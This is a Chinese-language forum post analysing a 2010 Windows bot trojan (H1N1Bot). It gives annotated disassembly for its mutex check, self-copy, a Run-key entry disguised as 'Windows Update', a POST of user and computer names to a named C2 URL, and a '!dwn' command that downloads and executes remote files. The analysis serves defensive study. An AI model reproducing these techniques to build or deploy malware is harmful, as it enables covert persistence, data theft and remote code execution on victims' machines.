

# Trojan.Win32.Scar.cuzp 木马分析

> 原文：[`www.pediy.com/kssd/pediy11/120760.html`](https://www.pediy.com/kssd/pediy11/120760.html)

病毒时间戳:2010-09-18  
名字是卡巴斯基报的  
在本地开个后门，接收远端指令，可以下载指定的 url 文件并执行，还可以清理病毒。  
谢谢【runstop】兄的提醒，命令以更正。  
指令包括"!dwn","!clo"和"!rem"，各部分说明：  
  
**1,创建名为"H1N1Bot"的 Mutex 对象，防止重复感染**  
  

代码:

```
00401481  /$  55            push    ebp
00401482  |.  8BEC          mov     ebp, esp
00401484  |.  83C4 FC       add     esp, -4
00401487  |.  68 BB304000   push    004030BB                         ; /MutexName = "H1N1Bot"
0040148C  |.  6A 00         push    0                                ; |InitialOwner = FALSE
0040148E  |.  6A 00         push    0                                ; |pSecurity = NULL
00401490  |.  E8 59000000   call    <jmp.&kernel32.CreateMutexA>     ; \\CreateMutexA
00401495  |.  8945 FC       mov     dword ptr \[ebp-4\], eax
00401498  |.  E8 63000000   call    <jmp.&kernel32.GetLastError>     ; \[GetLastError
0040149D  |.  3D B7000000   cmp     eax, 0B7
004014A2  |.  74 02         je      short 004014A6
004014A4  |.  C9            leave
004014A5  |.  C3            retn
004014A6  |>  FF75 FC       push    dword ptr \[ebp-4\]                ; /hObject
004014A9  |.  E8 34000000   call    <jmp.&kernel32.CloseHandle>      ; \\CloseHandle
004014AE  |.  6A 00         push    0                                ; /ExitCode = 0
004014B0  \\.  E8 3F000000   call    <jmp.&kernel32.ExitProcess>      ; \\ExitProcess

```

**2,获取当前系统 CSIDL\_APPDATA 路径，如：C:\\Documents and Settings\\Administrator\\Local Settings\\Applicaton Data.并在后追加文件名"\\winvv.exe"，然后与当前进程镜象路径对比，如果当前进程不是 winvv.exe，则复制当前文件到"CSIDL\_APPDATA\\winvv.exe",然后运行 winvv.exe,并退出本进程**  
  
代码:

```
00401092  /$  55            push    ebp
00401093  |.  8BEC          mov     ebp, esp
00401095  |.  81C4 FCFDFFFF add     esp, -204
0040109B  |.  68 00010000   push    100                              ; /Length = 100 (256.)
004010A0  |.  8D85 00FFFFFF lea     eax, dword ptr \[ebp-100\]         ; |
004010A6  |.  50            push    eax                              ; |Destination
004010A7  |.  E8 66040000   call    <jmp.&kernel32.RtlZeroMemory>    ; \\RtlZeroMemory
004010AC  |.  68 00010000   push    100                              ; /Length = 100 (256.)
004010B1  |.  8D85 00FEFFFF lea     eax, dword ptr \[ebp-200\]         ; |
004010B7  |.  50            push    eax                              ; |Destination
004010B8  |.  E8 55040000   call    <jmp.&kernel32.RtlZeroMemory>    ; \\RtlZeroMemory
004010BD  |.  68 00010000   push    100                              ; /BufSize = 100 (256.)
004010C2  |.  8D85 00FFFFFF lea     eax, dword ptr \[ebp-100\]         ; |
004010C8  |.  50            push    eax                              ; |PathBuffer
004010C9  |.  6A 00         push    0                                ; |hModule = NULL
004010CB  |.  E8 36040000   call    <jmp.&kernel32.GetModuleFileName>; \\GetModuleFileNameA
004010D0  |.  8D85 00FEFFFF lea     eax, dword ptr \[ebp-200\]
004010D6  |.  50            push    eax
004010D7  |.  6A 00         push    0
004010D9  |.  6A 00         push    0
004010DB  |.  6A 1C         push    1C
004010DD  |.  6A 00         push    0
004010DF  |.  E8 7C040000   call    <jmp.&shell32.SHGetFolderPathA>
004010E4  |.  68 60304000   push    00403060                         ; /StringToAdd = "\\winvv.exe"
004010E9  |.  8D85 00FEFFFF lea     eax, dword ptr \[ebp-200\]         ; |
004010EF  |.  50            push    eax                              ; |ConcatString
004010F0  |.  E8 35040000   call    <jmp.&kernel32.lstrcatA>         ; \\lstrcatA
004010F5  |.  8D85 00FEFFFF lea     eax, dword ptr \[ebp-200\]
004010FB  |.  50            push    eax                              ; /String2
004010FC  |.  8D85 00FFFFFF lea     eax, dword ptr \[ebp-100\]         ; |
00401102  |.  50            push    eax                              ; |String1
00401103  |.  E8 28040000   call    <jmp.&kernel32.lstrcmpA>         ; \\lstrcmpA
00401108  |.  83F8 00       cmp     eax, 0
0040110B  |.  74 6B         je      short 00401178
0040110D  |.  6A 00         push    0                                ; /FailIfExists = FALSE
0040110F  |.  8D85 00FEFFFF lea     eax, dword ptr \[ebp-200\]         ; |
00401115  |.  50            push    eax                              ; |NewFileName
00401116  |.  8D85 00FFFFFF lea     eax, dword ptr \[ebp-100\]         ; |
0040111C  |.  50            push    eax                              ; |ExistingFileName
0040111D  |.  E8 C6030000   call    <jmp.&kernel32.CopyFileA>        ; \\CopyFileA
00401122  |.  68 00010000   push    100                              ; /Length = 100 (256.)
00401127  |.  8D85 00FFFFFF lea     eax, dword ptr \[ebp-100\]         ; |
0040112D  |.  50            push    eax                              ; |Destination
0040112E  |.  E8 DF030000   call    <jmp.&kernel32.RtlZeroMemory>    ; \\RtlZeroMemory
00401133  |.  8D85 00FFFFFF lea     eax, dword ptr \[ebp-100\]
00401139  |.  50            push    eax
0040113A  |.  6A 00         push    0
0040113C  |.  6A 00         push    0
0040113E  |.  6A 1C         push    1C
00401140  |.  6A 00         push    0
00401142  |.  E8 19040000   call    <jmp.&shell32.SHGetFolderPathA>
00401147  |.  8D05 60304000 lea     eax, dword ptr \[403060\]
0040114D  |.  40            inc     eax
0040114E  |.  8985 FCFDFFFF mov     dword ptr \[ebp-204\], eax
00401154  |.  6A 00         push    0                                ; /IsShown = 0
00401156  |.  8D85 00FFFFFF lea     eax, dword ptr \[ebp-100\]         ; |
0040115C  |.  50            push    eax                              ; |DefDir
0040115D  |.  6A 00         push    0                                ; |Parameters = NULL
0040115F  |.  FFB5 FCFDFFFF push    dword ptr \[ebp-204\]              ; |FileName
00401165  |.  68 6B304000   push    0040306B                         ; |Operation = "open"
0040116A  |.  6A 00         push    0                                ; |hWnd = NULL
0040116C  |.  E8 F5030000   call    <jmp.&shell32.ShellExecuteA>     ; \\ShellExecuteA
00401171  |.  6A 00         push    0                                ; /ExitCode = 0
00401173  |.  E8 7C030000   call    <jmp.&kernel32.ExitProcess>      ; \\ExitProcess
00401178  |>  C9            leave
00401179  \\.  C3            retn

```

**3,把 winvv.exe 添加进启动项"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"中，项名为"Windows Update"**  
  
代码:

```
004011AE  /$  55                  push    ebp
004011AF  |.  8BEC                mov     ebp, esp
004011B1  |.  81C4 F8FEFFFF       add     esp, -108
004011B7  |.  68 00010000         push    100                              ; /Length = 100 (256.)
004011BC  |.  8D85 F8FEFFFF       lea     eax, dword ptr \[ebp-108\]         ; |
004011C2  |.  50                  push    eax                              ; |Destination
004011C3  |.  E8 4A030000         call    <jmp.&kernel32.RtlZeroMemory>    ; \\RtlZeroMemory
004011C8  |.  68 00010000         push    100                              ; /BufSize = 100 (256.)
004011CD  |.  8D85 F8FEFFFF       lea     eax, dword ptr \[ebp-108\]         ; |
004011D3  |.  50                  push    eax                              ; |PathBuffer
004011D4  |.  6A 00               push    0                                ; |hModule = NULL
004011D6  |.  E8 2B030000         call    <jmp.&kernel32.GetModuleFileName>; \\GetModuleFileNameA
004011DB  |.  8D45 FC             lea     eax, dword ptr \[ebp-4\]
004011DE  |.  50                  push    eax                              ; /pHandle
004011DF  |.  6A 02               push    2                                ; |Access = KEY\_SET\_VALUE
004011E1  |.  6A 00               push    0                                ; |Reserved = 0
004011E3  |.  68 70304000         push    00403070                         ; |Subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
004011E8  |.  68 01000080         push    80000001                         ; |hKey = HKEY\_CURRENT\_USER
004011ED  |.  E8 8C030000         call    <jmp.&advapi32.RegOpenKeyExA>    ; \\RegOpenKeyExA
004011F2  |.  83F8 00             cmp     eax, 0
004011F5  |.  75 2D               jnz     short 00401224
004011F7  |.  8D85 F8FEFFFF       lea     eax, dword ptr \[ebp-108\]         ;  获取当前进程镜像的路径长度
004011FD  |.  50                  push    eax                              ; /String
004011FE  |.  E8 39030000         call    <jmp.&kernel32.lstrlenA>         ; \\lstrlenA
00401203  |.  50                  push    eax                              ; /BufSize
00401204  |.  8D85 F8FEFFFF       lea     eax, dword ptr \[ebp-108\]         ; |
0040120A  |.  50                  push    eax                              ; |Buffer
0040120B  |.  6A 01               push    1                                ; |ValueType = REG\_SZ
0040120D  |.  6A 00               push    0                                ; |Reserved = 0
0040120F  |.  68 9F304000         push    0040309F                         ; |ValueName = "Windows Update"
00401214  |.  FF75 FC             push    dword ptr \[ebp-4\]                ; |hKey
00401217  |.  E8 68030000         call    <jmp.&advapi32.RegSetValueExA>   ; \\RegSetValueExA
0040121C  |.  FF75 FC             push    dword ptr \[ebp-4\]                ; /hObject
0040121F  |.  E8 BE020000         call    <jmp.&kernel32.CloseHandle>      ; \\CloseHandle
00401224  |>  C9                  leave
00401225  \\.  C3                  retn

```

  
**4,获取本机用户名及计算机名，post 到远端服务器  
http://mmmbsbt.co.cc/admin/bot.php?mode=2&ident=AdministratorPC-201008252144**  
  
代码:

```
004013D5  /$  55                  push    ebp
004013D6  |.  8BEC                mov     ebp, esp
004013D8  |.  83C4 FC             add     esp, -4
004013DB  |.  6A 40               push    40                               ; /Protect = PAGE\_EXECUTE\_READWRITE
004013DD  |.  68 00100000         push    1000                             ; |AllocationType = MEM\_COMMIT
004013E2  |.  68 00020000         push    200                              ; |Size = 200 (512.)
004013E7  |.  6A 00               push    0                                ; |Address = NULL
004013E9  |.  E8 30010000         call    <jmp.&kernel32.VirtualAlloc>     ; \\VirtualAlloc
004013EE  |.  8945 FC             mov     dword ptr \[ebp-4\], eax
004013F1  |.  C700 6D6F6465       mov     dword ptr \[eax\], 65646F6D        ;  向 buffer 中填充 mode=2&ident=
004013F7  |.  83C0 04             add     eax, 4
004013FA  |.  C700 3D322669       mov     dword ptr \[eax\], 6926323D
00401400  |.  83C0 04             add     eax, 4
00401403  |.  C700 64656E74       mov     dword ptr \[eax\], 746E6564
00401409  |.  83C0 04             add     eax, 4
0040140C  |.  C600 3D             mov     byte ptr \[eax\], 3D
0040140F  |.  40                  inc     eax
00401410  |.  50                  push    eax
00401411  |.  50                  push    eax
00401412  |.  E8 74FFFFFF         call    0040138B                         ;  向 buffer 追加当前系统用户名，并返回用户名长度
00401417  |.  8BC8                mov     ecx, eax
00401419  |.  58                  pop     eax
0040141A  |.  03C1                add     eax, ecx                         ;  eax = 用户名后地址
0040141C  |.  50                  push    eax                              ;  此时 buffer 内容为 mode=2&ident=Administrator
0040141D  |.  50                  push    eax
0040141E  |.  E8 8DFFFFFF         call    004013B0                         ;  获取计算机名，并追加到 buffer 中，返回计算机名长度
00401423  |.  FF75 FC             push    dword ptr \[ebp-4\]                ;  此时 buffer 内容为"mode=2&ident=AdministratorPC-201008252144"
00401426  |.  FF75 FC             push    dword ptr \[ebp-4\]
00401429  |.  E8 D2FBFFFF         call    00401000
0040142E  |.  68 00800000         push    8000                             ; /FreeType = MEM\_RELEASE
00401433  |.  6A 00               push    0                                ; |Size = 0
00401435  |.  FF75 FC             push    dword ptr \[ebp-4\]                ; |Address
00401438  |.  E8 E7000000         call    <jmp.&kernel32.VirtualFree>      ; \\VirtualFree
0040143D  |.  C9                  leave
0040143E  \\.  C3                  retn

```

**5,再 post http://mmmbsbt.co.cc/admin/bot.php?mode=2，并接收远端指令。指令包括"!dwn", "!clo", "!rem"  
  
"!dwn"指令：  
指令格式：!dwn EXE\_URL\_Address File\_Save\_Path Optional\_param  //三个参数  
从第一个参数中下载文件保存到第二个参数的路径中，然后立即执行下载的文件**  
  
代码:

```
004012A1  /$  55                  push    ebp
004012A2  |.  8BEC                mov     ebp, esp
004012A4  |.  83C4 F8             add     esp, -8
004012A7  |.  FF75 08             push    dword ptr \[ebp+8\]                   ; /String
004012AA  |.  E8 8D020000         call    <jmp.&kernel32.lstrlenA>            ; \\取得数据包长度
004012AF  |.  83F8 05             cmp     eax, 5
004012B2  |.  0F8E 8A000000       jle     00401342                            ;  小于等于 5 则退出
004012B8  |.  6A 05               push    5
004012BA  |.  FF75 08             push    dword ptr \[ebp+8\]
004012BD  |.  E8 A9FFFFFF         call    0040126B                            ;  获取指令参数
004012C2  |.  6A 20               push    20
004012C4  |.  FF75 08             push    dword ptr \[ebp+8\]
004012C7  |.  E8 5AFFFFFF         call    00401226                            ;  在参数中寻找空格的位置
004012CC  |.  0345 08             add     eax, dword ptr \[ebp+8\]
004012CF  |.  C600 00             mov     byte ptr \[eax\], 0                   ;  把空格用 0 替换
004012D2  |.  40                  inc     eax
004012D3  |.  8945 FC             mov     dword ptr \[ebp-4\], eax
004012D6  |.  50                  push    eax                                 ; /获取下一个参数长度
004012D7  |.  E8 60020000         call    <jmp.&kernel32.lstrlenA>            ; \\lstrlenA
004012DC  |.  83F8 00             cmp     eax, 0
004012DF  |.  74 61               je      short 00401342                      ;  如果无参数了则退出
004012E1  |.  6A 20               push    20
004012E3  |.  FF75 FC             push    dword ptr \[ebp-4\]
004012E6  |.  E8 3BFFFFFF         call    00401226                            ;  否则继续寻找参数
004012EB  |.  0345 FC             add     eax, dword ptr \[ebp-4\]
004012EE  |.  C600 00             mov     byte ptr \[eax\], 0
004012F1  |.  40                  inc     eax
004012F2  |.  50                  push    eax
004012F3  |.  50                  push    eax                                 ; /String
004012F4  |.  E8 43020000         call    <jmp.&kernel32.lstrlenA>            ; \\lstrlenA
004012F9  |.  83F8 00             cmp     eax, 0
004012FC  |.  74 44               je      short 00401342
004012FE  |.  58                  pop     eax
004012FF  |.  50                  push    eax
00401300  |.  68 B6304000         push    004030B6                            ; /String2 = "0000"
00401305  |.  50                  push    eax                                 ; |String1
00401306  |.  E8 25020000         call    <jmp.&kernel32.lstrcmpA>            ; \\lstrcmpA
0040130B  |.  83F8 00             cmp     eax, 0
0040130E  |.  74 32               je      short 00401342                      ;  如果参数最后是"0000"则退出
00401310  |.  58                  pop     eax
00401311  |.  50                  push    eax                                 ; /String2
00401312  |.  68 B6304000         push    004030B6                            ; |String1 = setup.004030B6
00401317  |.  E8 1A020000         call    <jmp.&kernel32.lstrcpyA>            ; \\把参数后的内容复制到全局变量中
0040131C  |.  6A 00               push    0
0040131E  |.  6A 00               push    0
00401320  |.  FF75 FC             push    dword ptr \[ebp-4\]
00401323  |.  FF75 08             push    dword ptr \[ebp+8\]                   ;  从远端服务器下载文件保存到本地
00401326  |.  6A 00               push    0
00401328  |.  E8 3F020000         call    <jmp.&urlmon.URLDownloadToFileA>
0040132D  |.  6A 01               push    1                                   ; /IsShown = 1
0040132F  |.  6A 00               push    0                                   ; |DefDir = NULL
00401331  |.  6A 00               push    0                                   ; |Parameters = NULL
00401333  |.  FF75 FC             push    dword ptr \[ebp-4\]                   ; |FileName
00401336  |.  68 6B304000         push    0040306B                            ; |Operation = "open"
0040133B  |.  6A 00               push    0                                   ; |hWnd = NULL
0040133D  |.  E8 24020000         call    <jmp.&shell32.ShellExecuteA>        ; \\ShellExecuteA
00401342  |>  C9                  leave
00401343  \\.  C2 0400             retn    4

```

  
**"!clo"指令：病毒进程退出**  
代码:

```
00401346  /$  6A 00               push    0                                   ; /ExitCode = 0
00401348  \\.  E8 A7010000         call    <jmp.&kernel32.ExitProcess>         ; \\ExitProcess

```

  
  
**"!rem"指令：  
删除病毒的注册表启动项"Windows Update",并退出病毒进程**  
  
代码:

```
0040117A  /$  55                  push    ebp
0040117B  |.  8BEC                mov     ebp, esp
0040117D  |.  83C4 FC             add     esp, -4
00401180  |.  8D45 FC             lea     eax, dword ptr \[ebp-4\]
00401183  |.  50                  push    eax                              ; /pHandle
00401184  |.  6A 02               push    2                                ; |Access = KEY\_SET\_VALUE
00401186  |.  6A 00               push    0                                ; |Reserved = 0
00401188  |.  68 70304000         push    00403070                         ; |Subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
0040118D  |.  68 01000080         push    80000001                         ; |hKey = HKEY\_CURRENT\_USER
00401192  |.  E8 E7030000         call    <jmp.&advapi32.RegOpenKeyExA>    ; \\RegOpenKeyExA
00401197  |.  68 9F304000         push    0040309F                         ; /ValueName = "Windows Update"
0040119C  |.  FF75 FC             push    dword ptr \[ebp-4\]                ; |hKey
0040119F  |.  E8 D4030000         call    <jmp.&advapi32.RegDeleteValueA>  ; \\RegDeleteValueA
004011A4  |.  FF75 FC             push    dword ptr \[ebp-4\]                ; /hObject
004011A7  |.  E8 36030000         call    <jmp.&kernel32.CloseHandle>      ; \\CloseHandle
004011AC  |.  C9                  leave
004011AD  \\.  C3                  retn

```

  
**6，每处理完一个指令则 Sleep 一分钟，继续接收指令，以此循环**

上传的附件
| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || 病毒样本.rar\[解压密码：kill\_virus\]  
 |